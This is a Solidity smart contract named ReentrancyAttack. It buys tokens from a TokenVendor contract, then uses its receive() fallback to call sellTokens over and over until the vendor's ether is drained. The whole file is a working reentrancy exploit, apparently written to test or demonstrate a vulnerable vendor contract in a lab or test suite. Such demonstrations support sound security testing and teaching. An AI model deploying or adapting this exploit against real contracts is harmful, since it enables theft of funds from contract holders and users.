// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./TokenVendor.sol";
import "./BlockfulToken.sol";

contract ReentrancyAttack {
    TokenVendor public vendor;
    BlockfulToken public token;
    uint public counter;

    constructor(address _vendor, address _token) {
        vendor = TokenVendor(_vendor);
        token = BlockfulToken(_token);
    }

    receive() external payable {
        bool iHaveTokens = counter >= 1e18;
        bool vendorHasEth = address(vendor).balance >= 1e18;

        if (vendorHasEth && iHaveTokens) {
            counter -= 1e18;
            vendor.sellTokens(1e18);
        }
    }

    function run() external payable {
        vendor.buyTokens{value: 10 ether}();
        counter = token.balanceOf(address(this));
        token.approve(address(vendor), 10 * 1e18);
        vendor.sellTokens(1e18);
    }
}
